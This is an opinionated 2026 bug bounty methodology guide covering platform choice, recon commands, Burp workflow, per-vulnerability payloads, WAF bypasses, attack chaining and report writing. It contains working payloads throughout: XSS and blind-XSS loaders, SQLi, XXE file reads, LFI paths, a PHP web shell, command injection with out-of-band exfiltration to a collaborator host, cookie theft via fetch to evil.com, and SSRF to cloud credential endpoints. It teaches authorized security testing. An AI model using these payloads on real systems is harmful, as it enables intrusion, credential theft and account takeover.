# 2026 Practical Bug Bounty Guide

> Built on real-world experience. Opinionated by design. Updated for 2026.

---

## Table of Contents

1. [Mindset & Core Rules](#1-mindset--core-rules)
2. [Picking a Platform](#2-picking-a-platform)
3. [Picking a Program](#3-picking-a-program)
4. [Phase 1 — Recon & Asset Discovery](#4-phase-1--recon--asset-discovery)
5. [Phase 2 — Manual Exploration](#5-phase-2--manual-exploration)
6. [Phase 3 — Burp Suite Deep Dive](#6-phase-3--burp-suite-deep-dive)
7. [Phase 4 — Vulnerability Testing](#7-phase-4--vulnerability-testing)
   - [XSS](#xss-cross-site-scripting)
   - [SSTI](#ssti-server-side-template-injection)
   - [SQL Injection](#sql-injection)
   - [IDOR / Broken Access Control](#idor--broken-access-control)
   - [CSRF](#csrf)
   - [SSRF](#ssrf)
   - [XXE](#xxe)
   - [LFI / RFI](#lfi--rfi)
   - [File Upload](#file-upload)
   - [Command Injection](#command-injection)
   - [Open Redirects](#open-redirects)
   - [Authentication & Session](#authentication--session)
   - [Business Logic](#business-logic)
   - [Modern Attack Surface (2026)](#modern-attack-surface-2026)
8. [WAF Bypass Techniques](#8-waf-bypass-techniques)
9. [Chaining Vulnerabilities](#9-chaining-vulnerabilities)
10. [Reporting](#10-reporting)
11. [Tools Reference](#11-tools-reference)

---

## 1. Mindset & Core Rules

These rules should be tattooed on your brain before you open a single browser tab.

- **PoC or GTFO.** Never submit a report without a working proof of concept that demonstrates real impact. A vulnerability with no impact is noise, not a finding.
- **Know your enemy.** You must understand the application before you attack it. Spend days mapping it — not hours.
- **Out-think, don't out-race.** Speed hunters pile into obvious endpoints and create duplicates. Find the leftovers: the tacked-on import functions, the legacy API, the feature no one reads the docs for.
- **Every tool lies sometimes.** Scanner alerts are hypotheses, not conclusions. Confirm everything manually.
- **VDP is your training ground.** Less competition, lower-hardened apps, earns you private program invites. Don't chase money before you have a process.
- **Barriers are your friends.** Dutch-only program? Non-English docs? Mobile-only setup process? Other hunters drop off. You push through.
- **Impact is king.** Two vulnerabilities of the same type can have wildly different severities depending on what you can do with them. Always ask: *what can an attacker actually achieve here?*
- **GDPR multiplier (EU targets).** Accessing another user's PII on a European program is a GDPR violation by definition. This significantly raises severity — use it when you can.

---

## 2. Picking a Platform

There is no single best platform. Pick the one that fits your current level and goals. Below is an honest breakdown.

### Intigriti

**Pros**
- Less crowded than HackerOne or Bugcrowd
- Triagers are helpful and won't sink your reputation for a borderline report
- No negative karma for invalid submissions
- After a few valid findings, you can be invited to the community Slack — direct access to triagers and the community manager
- Wide range of program types (web, mobile, VPS, IoT)
- Many EU programs in Dutch or other local languages — install a translate plugin and that barrier becomes your advantage

**Cons**
- Smaller total program count than H1/BC
- Fewer fully public paid programs; most paid work comes through private invites earned over time

### HackerOne

**Pros**
- Largest selection of programs in the world
- Regular CTFs with private program invites as prizes — great way to get into competitive programs
- Community events and educational resources

**Cons**
- Negative karma for invalid reports; too many puts you in a restricted queue (30-day wait before re-submitting to some programs)
- Very high competition on popular programs

### Bugcrowd

**Pros**
- Massive program selection
- Bugcrowd Academy provides in-depth vulnerability learning resources
- Helpful triager feedback

**Cons**
- Same negative karma system as HackerOne
- High competition

### Finding programs outside platforms

```
site:target.com "responsible disclosure"
site:target.com "bug bounty"
site:target.com "security.txt"
/.well-known/security.txt
```

Use the [bug-bounty-dorks](https://github.com/sushiwushi/bug-bounty-dorks) repository for a full Google dork collection.

---

## 3. Picking a Program

> "Picking a program is like picking a shoe — make sure it fits."

**What to look for in a target:**

- Applications where you can register accounts and explore features freely
- Multi-user, multi-role applications (admin, manager, member, viewer, etc.) — these contain business logic bugs that tool scanners miss
- Import/export features, API integrations, and any functionality built *on top of* an existing feature. Integration points are security weak spots
- Swagger/OpenAPI docs or a public developer API — read them, they are a blueprint
- Applications with a free tier + a paid/premium tier — scope difference between plans is a common source of BAC bugs

**VDP vs. Paid — start with VDP:**

| | VDP | Paid |
|---|---|---|
| Competition | Low | High |
| Hardening | Often lower | Often higher |
| Benefit | Points → private invites | Direct cash payouts |

Start VDP, earn private invites, *then* get paid. The money follows the process.

**Scope advice:**

Avoid programs with `*.target.com` as your first target. A wide wildcard scope sounds exciting but costs you weeks in recon before you even test. Start on main apps (`app.target.com` or `target.com`), refine your technique, *then* scale your recon.

---

## 4. Phase 1 — Recon & Asset Discovery

> Recon is the foundation. But remember: recon is not hacking. Its only job is to find the surface you will attack.

### Subdomain Enumeration

```bash
# Passive
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt
amass enum -passive -d target.com >> subdomains.txt

# Certificate transparency
# https://crt.sh/?q=%25.target.com

# Deduplicate
sort -u subdomains.txt -o subdomains.txt
```

### Check Which Subdomains Are Alive

```bash
cat subdomains.txt | httprobe | tee alive.txt
```

### Visual Recon (Flyover)

```bash
# EyeWitness or Aquatone for screenshots of every live subdomain
eyewitness --web -f alive.txt --timeout 30
cat alive.txt | aquatone
```

### Port Scanning

```bash
# Fast full-port scan with naabu, confirm with nmap
naabu -iL alive.txt -p - -o open-ports.txt
nmap -sV -sC -p <ports> <target>
```

### Directory & Content Discovery

```bash
gobuster dir -u https://target.com -w /path/to/wordlist -x php,html,js,json,bak,old,zip
ffuf -u https://target.com/FUZZ -w /path/to/wordlist -mc 200,301,302,403
```

### JavaScript Analysis

```bash
# Extract URLs from JS files
python3 linkfinder.py -i https://target.com -d -o cli

# Get all historical URLs
gau target.com | tee gau-urls.txt
waybackurls target.com | tee wayback-urls.txt
```

Look specifically for:
- Hardcoded API keys, tokens, or credentials
- Internal endpoint paths not exposed in the UI
- Commented-out code with old endpoint references

### Google & GitHub Dorking

```
# Google
site:target.com filetype:js
site:target.com inurl:api
site:target.com "internal use only"
site:target.com ext:json | ext:xml | ext:yaml
site:target.com "Authorization: Bearer"

# GitHub
org:targetname password
org:targetname secret
org:targetname api_key
org:targetname "Authorization:"
```

Reference: [GitHub Recon - It's Really Deep](https://shahjerry33.medium.com/github-recon-its-really-deep-6553d6dfbb1f)

### Shodan & Passive Sources

```
hostname:target.com
org:"Target Company Name"
ssl:"target.com"
```

### Automated Vulnerability Scanning

```bash
# Nuclei — run after asset discovery
nuclei -l alive.txt -t nuclei-templates/ -o nuclei-output.txt

# Nikto — per-host
nikto -h https://target.com
```

> **Important:** Scanner results are starting points, not findings. Every alarm requires manual confirmation before reporting.

---

## 5. Phase 2 — Manual Exploration

This phase is non-negotiable. No tool replaces understanding the application.

### Setup

1. Open Burp Suite with scope set to the target
2. Proxy all traffic through Burp — the site map will fill as you browse
3. Create test accounts for every available role (admin, manager, user, viewer, guest)
4. If there is a paid tier, consider buying it — the reduced attack surface of free accounts is a real limitation

### The Poisoned Registration Trick

When creating accounts or filling any profile field, inject both XSS and SSTI payloads from the start:

```
<img src=x onerror=alert(document.domain)>${{7*7}}{{7*7}}
```

Insert this into every field: username, first name, last name, address, bio, preferences — everywhere. This payload travels through the application as you use it and may fire in an admin panel, a report PDF, an email template, or a backend system days later.

### Exploration Checklist

- [ ] Use the application as a normal user for each role — trigger every feature
- [ ] Read the product documentation or knowledge base in full
- [ ] Read the API documentation / Swagger UI if available — `site:target.com swagger`, `site:target.com api/docs`, `site:target.com openapi.json`
- [ ] Note every privilege level and what each can do
- [ ] Note every integration point: import, export, webhooks, third-party logins, payment flows, email triggers
- [ ] Note every place that accepts file uploads
- [ ] Note every place that renders user-supplied content
- [ ] Note every URL parameter that appears to interact with the backend
- [ ] Create a mindmap: [XMind](https://www.xmind.net/) or any tool you prefer

### Parameters worth flagging immediately

| Pattern | Likely target |
|---|---|
| `url=`, `src=`, `dest=`, `feed=`, `webhook=` | SSRF |
| `file=`, `page=`, `template=`, `path=`, `include=` | LFI/RFI |
| `id=`, `user_id=`, `order=`, `invoice=`, `doc=` | IDOR |
| `redirect=`, `next=`, `returnTo=`, `goto=` | Open Redirect |
| `q=`, `search=`, `name=`, `title=`, `comment=` | XSS / SSTI / SQLi |
| `cmd=`, `exec=`, `shell=`, `ping=`, `host=` | Command Injection |
| Any XML body or file upload accepting XML/DOCX/XLSX/SVG | XXE |

---

## 6. Phase 3 — Burp Suite Deep Dive

### Filter to Parameterised Requests

In the Burp **Site Map**, open the filter and enable **"Show only parameterized requests"**. This cuts the noise and surfaces the endpoints worth testing.

### Repeater Strategy

For each interesting request:
1. Send it to Repeater
2. Understand what the endpoint does by reading the response carefully
3. Tamper with one parameter at a time — change values, remove them, duplicate them, send unexpected types (string where int is expected, negative numbers, huge numbers)
4. Look for different responses — an error, a changed status code, a timing difference

### Intruder / ffuf Strategy

Use Intruder (or ffuf for speed) to:
- Brute-force IDs (sequential integers, UUIDs, hashes)
- Fuzz parameter values with injection payloads
- Test for rate-limiting weaknesses

### Inferring New Endpoints

If you see `/api/v2/getInvoices`, the older `/api/v1/getInvoices` very likely still exists — and is probably less secure. Always check:
- Version downgrades: `v2` → `v1`, `v3` → `v2` → `v1`
- Alternate resource paths: `/api/admin/`, `/internal/`, `/private/`
- HTTP method tampering: if only `GET` is documented, try `POST`, `PUT`, `DELETE`, `PATCH`

### Hidden Parameters

When saving settings or profile data, intercept the request and look for parameters the UI does not expose. Try adding:
- `role=admin`
- `isAdmin=true`
- `status=active`
- `plan=enterprise`

Mass-assignment vulnerabilities are frequently found this way.

---

## 7. Phase 4 — Vulnerability Testing

---

### XSS (Cross-Site Scripting)

#### Initial probe — insert everywhere

```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
"><script>alert(1)</script>
{{7*7}}
```

#### Stored XSS

- Test every input that is displayed to any other user: profile fields, comments, messages, product names, filenames, notes
- Start minimal: `<a href="#">test</a>` — if the tag renders, escalate
- Target admin-facing fields (support ticket subjects, user display names) for higher-severity stored XSS into privileged contexts

#### Reflected XSS

- Test every URL parameter and search query
- Check error pages (404, 403, 500) — many reflect the URL path or a query parameter
- Check the `Referer` header — some apps reflect it in error messages

#### DOM XSS

- Check for dangerous JavaScript sinks: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `location.href` — where any of these consume user-controlled input
- DOM XSS never reaches the server, so server-side scanning won't find it
- Burp Suite Pro's scanner can detect DOM XSS; use it as a complement to manual review

#### Blind XSS

- Use [XSS Hunter](https://xsshunter.trufflesecurity.com/) — you get a callback with a screenshot when your payload fires in an admin panel or backend
- Inject into every field from day one — payloads can fire days later
- Payloads to use:

```html
"><script src=https://yourxsshunter.xss.ht></script>
'"><script src=https://yourxsshunter.xss.ht></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yourxsshunter.xss.ht\';document.body.appendChild(a)')
```

#### XSS Filter Evasion

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Breaking up keywords -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Event handler alternatives (not onload / onerror) -->
<body onresize=alert(1)>
<input autofocus onfocus=alert(1)>
<svg><animate onbegin=alert(1)>

<!-- Attribute context breakout -->
" onmouseover="alert(1)
' autofocus onfocus='alert(1)

<!-- JS string context -->
'; alert(1)//
\'; alert(1)//

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Polyglot -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

<!-- Base64 data URI -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

### SSTI (Server-Side Template Injection)

Insert into every available field at account creation and throughout testing:

```
{{7*7}}          → 49 = Jinja2, Twig
${7*7}           → 49 = Freemarker, Velocity, JavaScript templates
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Ruby (non-ERB)
*{7*7}           → 49 = Spring (Java)
}}{{7*7}}        → Breakout then inject
```

If confirmed, use [tplmap](https://github.com/epinna/tplmap) for automated exploitation. SSTI can lead to RCE — escalate carefully and document every step.

---

### SQL Injection

- Inject into every parameter that touches the database: GET/POST body, cookies, HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`)
- Start with `'` and observe: error? different response? timing change?

**Quick detection payloads:**

```sql
'
''
`
`)
'))
' OR '1'='1
' OR 1=1--
' AND SLEEP(5)--
1; SELECT SLEEP(5)--
{"$gt":""}        (NoSQL — MongoDB)
```

**Time-based blind:**

```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
' AND BENCHMARK(5000000,MD5(1))--
```

Once a parameter confirms injection, automate with `sqlmap`:

```bash
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3 --batch
# For POST:
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch
```

Also test for **second-order SQLi**: data stored harmlessly now may be used in a later query without sanitisation.

---

### IDOR / Broken Access Control

**Setup: create all the accounts you need**

- User A and User B (same role) — for horizontal IDOR
- Admin and Standard user — for vertical BAC
- Two separate organisations/tenants if applicable — for tenant isolation testing

**Test methodology:**

1. Perform an action as User A, capture the request in Burp
2. Copy the request to Repeater, switch session cookie to User B (use Burp's multi-session feature or manually swap cookies)
3. Replace any object identifiers (IDs, GUIDs, slugs) with resources owned by User A
4. Observe whether User B can access or modify User A's resources

**Where to look:**

- `GET /users/{id}`, `GET /orders/{id}`, `GET /invoices/{id}`
- `PUT/PATCH /profile/{id}`, `DELETE /document/{id}`
- API responses that contain other users' data
- Export functions — does exporting your data accidentally include other users' data?
- Webhook configurations that reference other accounts

**GUID IDOR amplification:** if a GUID is used and you think it limits the bug's severity, find an endpoint that *leaks* or *lists* those GUIDs. That leak + the IDOR forms a complete exploit chain and significantly improves the severity rating.

---

### CSRF

Focus only on **authenticated, state-changing actions** — not login/logout.

**Test:**

- Does the sensitive request (email change, password change, account deletion, payment) include a CSRF token?
- Submit with a wrong token — does the server accept it?
- Remove the CSRF token parameter entirely — does the server accept it?
- Check `SameSite` cookie attribute — `None` or absent = higher CSRF risk

**Minimal CSRF PoC:**

```html
<html>
  <body>
    <form action="https://target.com/settings/email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Click me" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Chain ideas:** CSRF → email change → password reset link sent to attacker = full account takeover.

---

### SSRF

**Where to look:**

- Parameters: `url=`, `src=`, `dest=`, `feed=`, `webhook=`, `callback=`, `redirect=`, `load=`, `proxy=`
- Any feature that fetches a URL on your behalf (link preview, PDF generation, webhook, import from URL)

**Detect blind SSRF first:**

```
https://your-collaborator-id.burpcollaborator.net
https://your-subdomain.interactsh.com
```

If you get a DNS/HTTP callback — SSRF is confirmed.

**Escalate to internal resources:**

```
http://127.0.0.1/
http://localhost/admin
http://169.254.169.254/latest/meta-data/                    (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/         (GCP — needs header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)
http://192.168.0.1/
```

**Filter bypass techniques:**

```
http://[::1]/                    IPv6 localhost
http://2130706433/               Decimal IP for 127.0.0.1
http://0x7f000001/               Hex IP
http://127.1/                    Short form
http://127.0.0.1#@evil.com       Hash trick
http://target.com@127.0.0.1      @ notation
```

---

### XXE

Test everywhere XML is consumed — including document uploads.

**Basic file read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**SVG upload (XXE via image upload):**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX/XLSX XXE:** these formats are ZIP archives. Unzip, embed the XXE payload in `word/document.xml` or `xl/workbook.xml`, re-zip and upload.

**Blind XXE (out-of-band):**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://your-collaborator.com/malicious.dtd">
  %xxe;
]>
<root/>
```

---

### LFI / RFI

**Detection:** parameters like `file=`, `page=`, `template=`, `path=`, `include=`, `module=`

**Linux traversal:**

```
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../var/log/apache2/access.log
```

**Windows traversal:**

```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
```

**PHP wrappers:**

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input (POST body as PHP)
expect://id
```

**Null byte (old PHP):**

```
../../../../etc/passwd%00
```

---

### File Upload

**Extension bypass order of operations:**

1. Upload `.php` — blocked? Try `.php5`, `.phtml`, `.phar`, `.shtml`
2. Change `Content-Type` to `image/jpeg` while keeping dangerous extension
3. Double extension: `shell.php.jpg`, `shell.jpg.php`
4. Null byte: `shell.php%00.jpg`
5. Upload SVG with XSS or XXE payload
6. Upload DOCX/XLSX with XXE payload

**Web shell (PHP):**

```php
<?php system($_GET['cmd']); ?>
```

**After upload:** is the file served from a web-accessible path? If yes, a web shell is directly executable via browser.

---

### Command Injection

**Target parameters:** anything that looks like it executes a system call — hostname, IP address, domain, filename, shell options, email address (in some mail-sending features)

**Chaining operators:**

```bash
; id
| id
|| id
&& id
`id`
$(id)
%0Aid        (URL-encoded newline)
```

**Blind via timing:**

```bash
; sleep 5
| ping -c 5 127.0.0.1
```

**Blind via out-of-band:**

```bash
; curl https://your-collaborator.com/$(whoami)
; nslookup $(whoami).your-collaborator.com
```

**Windows variants:**

```cmd
& whoami
| whoami
&& whoami
; whoami
%26 whoami
```

---

### Open Redirects

**Target parameters:** `redirect=`, `url=`, `next=`, `return=`, `returnTo=`, `goto=`, `target=`, `redir=`, `destination=`

**Basic test:**

```
redirect=https://evil.com
redirect=//evil.com
redirect=javascript:alert(1)
```

**Bypass techniques:**

```
https://target.com@evil.com
https://target.com.evil.com
https://evil.com%23target.com
https://evil.com%3F.target.com
//evil.com/%2F..
```

Open redirects are low severity alone. Demonstrate a realistic chain (e.g., OAuth code theft, phishing) to elevate severity.

---

### Authentication & Session

**Username enumeration:**

- Compare responses for valid vs. invalid usernames (timing, message, status code)
- Test registration: "email already in use" confirms account existence

**Password reset:**

- Add a second `email` parameter: `email=victim@target.com&email=attacker@evil.com`
- Check if reset tokens are in the URL (they will appear in server logs and Referer headers)
- Test token reuse: can you use the same token twice?
- Test for weak/predictable tokens (sequential, timestamp-based)

**JWT testing:**

```bash
# alg:none attack — remove signature entirely
# Algorithm confusion — if RS256 is used, try HS256 signed with the public key
# Weak secret bruteforce
hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
```

**Session management:**

- Does the session token change after login? (session fixation if not)
- Does logout invalidate the token server-side?
- Is the token in a URL parameter anywhere?
- Does the token remain valid after password change?
- After deleting an account, does the session still work?

**Cookie flags (check all session cookies):**

| Flag | If missing |
|---|---|
| `HttpOnly` | XSS can steal the cookie |
| `Secure` | Cookie sent over HTTP |
| `SameSite=Strict/Lax` | CSRF risk increases |
| Correct `Domain` scope | Subdomain can read cookie |

---

### Business Logic

This is where the unloved bugs live and duplicate rates are lowest.

**What to test:**

- **Race conditions:** two requests for the same limited resource sent simultaneously (use Burp's "Send group in parallel" feature). Classic targets: coupon codes, referral bonuses, stock purchase, loyalty points
- **Negative values:** enter `-1` quantity in a cart, transfer `-100` to someone — do you gain money?
- **Workflow bypass:** skip a required step in a multi-step process (e.g., skip payment, skip verification)
- **State manipulation:** send a request that is only valid in state A while the resource is in state B
- **Limit bypass:** a feature limits you to 5 items — can you send 6 by replaying or modifying a request?
- **Privilege gates:** does the price come from the client? Does the role come from the client?

---

### Modern Attack Surface (2026)

#### GraphQL

Many applications have moved to GraphQL but left introspection enabled in production.

```bash
# Check if introspection is enabled
{"query": "{__schema{types{name}}}"}

# Full schema dump
python3 graphql-map.py --url https://target.com/graphql

# Common issues
# - IDOR via object IDs in query args
# - Missing auth checks on mutations
# - Batching attacks (rate limit bypass by sending many queries in one request)
# - Introspection in production (information disclosure)
```

#### WebSockets

- Intercept WebSocket messages in Burp
- Test message tampering — is server-side validation as strict as HTTP endpoints?
- Test cross-site WebSocket hijacking (CSWSH)
- Look for user IDs or session tokens embedded in messages

#### OAuth 2.0 / OIDC

- Test for `state` parameter absence or reuse → CSRF on OAuth flow
- Test `redirect_uri` validation — can you redirect the code to an attacker-controlled domain?
- Test for open redirect chaining: `redirect_uri=https://target.com/logout?redirect=https://evil.com`
- Test for code reuse: can an authorization code be used more than once?
- Check PKCE implementation — absence of PKCE in public clients is a finding

#### API Keys & JWT in JS Files

```bash
# Automated
trufflehog filesystem /path/to/js/files
# Or grep JS files from gau/wayback output
grep -rE "(api_key|apikey|secret|token|password|Authorization)" *.js
```

#### Prototype Pollution (JavaScript)

```
?__proto__[admin]=true
?constructor[prototype][admin]=true
```

Confirm in browser devtools: `Object.prototype.admin` should return `true` if vulnerable.

#### Cache Poisoning

- Test unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Port`, `X-Host`
- If any of these are reflected in the response or influence caching, you may be able to poison the cache for all users

#### Subdomain Takeover

Identify subdomains pointing to decommissioned external services (GitHub Pages, Heroku, Azure, Fastly):

```bash
subzy run --targets subdomains.txt
nuclei -l subdomains.txt -t nuclei-templates/dns/
```

Look for CNAME records pointing to unclaimed services. Claim the service → full control of that subdomain.

---

## 8. WAF Bypass Techniques

### Generic Techniques

```
# Base64 data URI
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# Space substitution
<Img/src=x/onerror=alert(1)>
<svg%09onload=alert(1)>   (%09 = tab)

# Comment injection (SQL)
SE/**/LECT
UN/**/ION

# Case variation
SeLeCt 1,2,3

# URL encoding (single and double)
%3Cscript%3E
%253Cscript%253E

# Unicode lookalikes
ē instead of e (some WAFs normalise, some don't)

# Newlines in JS URI
j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert(1)

# Wildcard/comment injection in file paths (command injection bypass)
/etc/pa*wd
/etc/pa's'wd
cat${IFS}/etc/passwd

# Custom HTML tags
<CUSTOM id=x onfocus=alert(1) tabindex=1>#x
```

### Barracuda Specific

```html
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

### Reference

Full WAF bypass collection: [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF#known-bypasses)

---

## 9. Chaining Vulnerabilities

Solo low-severity bugs become high-severity chains. Always ask: *can I combine this with something else?*

### XSS → Account Takeover

1. Find stored XSS in a field visible to admins
2. Payload steals the admin's non-HttpOnly session cookie: `fetch('https://evil.com/?c='+document.cookie)`
3. Use the stolen cookie to authenticate as the admin

**Amplifier:** if the session token never rotates, the stolen cookie is valid indefinitely.

### XSS → CSRF Bypass

Stored XSS bypasses CSRF tokens entirely — the JavaScript runs in the victim's browser and can read the CSRF token from the DOM, then submit a request with it.

```javascript
fetch('/settings').then(r => r.text()).then(html => {
  const token = html.match(/csrf_token" value="([^"]+)"/)[1];
  fetch('/settings/email', {
    method: 'POST',
    body: `email=attacker@evil.com&csrf_token=${token}`
  });
});
```

### CSRF → Stored XSS → Worm

1. CSRF tricks the victim into posting content with a stored XSS payload
2. That XSS payload then replicates itself via CSRF to every user who views the page

### IDOR + Information Leak → Full Account Enumeration

1. Find an endpoint that leaks or lists user GUIDs (low/info)
2. Use those GUIDs in an IDOR to access every user's data (escalates to medium/high)

### Open Redirect → OAuth Code Theft

1. OAuth callback URL accepts open redirects: `redirect_uri=https://target.com/callback?next=https://evil.com`
2. After OAuth flow, the authorization code is in the URL, and the redirect sends the victim (with the code in the Referer header) to the attacker's server

### SSRF → Cloud Metadata → RCE

1. Find SSRF pointing to internal network
2. Access `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
3. Leaked AWS credentials allow direct access to S3, EC2, etc.

### Password Reset + CSRF → Account Takeover

1. CSRF triggers a password reset
2. Reset link is sent to victim's email — not directly exploitable
3. *But:* CSRF on the "change email" endpoint first, before triggering the reset → reset link goes to attacker's email

---

## 10. Reporting

A great bug reported badly gets marked as informational. A clear, well-structured report earns you the payout and the reputation.

### Report Structure

```
Title: [Severity] Short, specific description
e.g. [High] Stored XSS in user display name allows session cookie theft

Severity: Critical / High / Medium / Low / Informational
CVSS: (if the program uses it)

Summary:
A 2-3 sentence description of the vulnerability, affected component, and impact.

Steps to Reproduce:
1. Log in as User A
2. Navigate to Settings → Profile
3. Set display name to: <img src=x onerror=alert(document.domain)>
4. Save
5. Log in as User B, navigate to the admin user list
6. The payload fires in the admin context — XSS executes as admin

Impact:
Explain what an attacker can concretely achieve. Reference data, accounts, or systems at risk.
Mention GDPR implications if PII is accessible (EU programs).

PoC:
Screenshot, screen recording, or Burp export confirming the finding.

Remediation (optional but welcomed):
Short suggestion: encode user-supplied data before rendering in HTML.
```

### Severity Calibration Tips

- **No impact = no finding.** If you can't articulate what an attacker gains, do more work before submitting.
- **Escalate with chains.** An open redirect is low. An open redirect + OAuth code theft is high.
- **GDPR is a severity multiplier** on EU targets. Accessing another user's PII is a violation beyond the technical bug.
- **Admin-only XSS** is still valid — demonstrate what an attacker can do once they have admin XSS.
- **Self-XSS** is almost universally out of scope unless you can show a realistic delivery vector.

---

## 11. Tools Reference

### Proxy & Interception

| Tool | Use |
|---|---|
| Burp Suite Pro | Core proxy, scanner, Collaborator (SSRF/blind XSS/blind XXE detection) |
| OWASP ZAP | Free alternative; useful for automated scanning |

### Recon

| Tool | Use |
|---|---|
| subfinder | Passive subdomain enumeration |
| assetfinder | Fast passive subdomain discovery |
| amass | In-depth subdomain enumeration |
| httprobe | Check which subdomains are live |
| aquatone / EyeWitness | Subdomain screenshot flyover |
| gau / waybackurls | Historical URL discovery |
| linkfinder | Extract endpoints from JS files |
| naabu | Fast port scanner |
| nmap | Detailed port/service scanner |
| shodan | Passive internet-wide scanning |
| crt.sh | Certificate transparency lookup |

### Fuzzing & Scanning

| Tool | Use |
|---|---|
| gobuster / ffuf / feroxbuster | Directory & content brute-forcing |
| sqlmap | SQL injection automation |
| nuclei | Template-based vulnerability scanning |
| nikto | Web server misconfiguration scanner |
| dalfox | XSS automation and parameter fuzzing |
| tplmap | SSTI exploitation |
| subzy | Subdomain takeover detection |

### Reporting & Tracking

| Tool | Use |
|---|---|
| XSS Hunter | Blind XSS callback receiver with screenshots |
| Burp Collaborator | Out-of-band detection (SSRF, blind SQLi, XXE, SSTI) |
| interactsh | Open-source Collaborator alternative |
| Caido | Modern Burp alternative (rising in 2026) |

### Custom Scripts (this workspace)

| Script | Purpose |
|---|---|
| [AutoSubdomainContentDiscXSSDalfox.py](Scripts/AutoSubdomainContentDiscXSSDalfox.py) | Automates subdomain enum → content discovery → XSS scanning |
| [BugBountyAutomator.py](Scripts/BugBountyAutomator.py) | Full-pipeline bug bounty automation |
| [BACProxy.py](Scripts/BACProxy.py) | Broken access control proxy testing |
| [autoScan.sh](Scripts/autoScan.sh) | Initial automated scan wrapper |
| [initialScan.sh](Scripts/initialScan.sh) | First-pass target scan |
| [webapp_pentest.py](Scripts/webapp_pentest.py) | Web app pentest helper |

### Wordlists

- [dir23.txt](wordlists/dir23.txt) — directory brute-forcing
- [dirlist.txt](wordlists/dirlist.txt) — directory brute-forcing
- SecLists (install separately): `git clone https://github.com/danielmiessler/SecLists`

---

## Quick Reference Card

```
PHASE 1 — RECON
  subfinder + assetfinder + amass → subdomains
  httprobe → alive hosts
  gau + waybackurls → historical URLs
  linkfinder → JS endpoints
  nuclei → automated scanning
  Google + GitHub dorking

PHASE 2 — EXPLORE
  Register all roles
  Inject XSS + SSTI payload into every field from the start
  Read docs, API docs, Swagger
  Map all features and integration points
  Flag interesting parameters by type

PHASE 3 — BURP DEEP DIVE
  Filter to parameterised requests
  Repeater each interesting endpoint
  Infer API versions (v2 → v1)
  Test HTTP method tampering
  Hunt for mass assignment (add role/admin params)

PHASE 4 — TEST
  XSS → SSTI → SQLi → IDOR → CSRF → SSRF → XXE
  Auth & session checks
  Business logic (race conditions, negative values, workflow bypass)
  Modern surface: GraphQL, WebSockets, OAuth, prototype pollution

CHAIN → REPORT
  Combine low bugs into high chains
  PoC first — no PoC, no report
  Prove impact explicitly
  GDPR multiplier on EU targets
```

---

*Last updated: March 2026. Built on Rat's methodology and practical experience. Expand this guide with every new finding.*
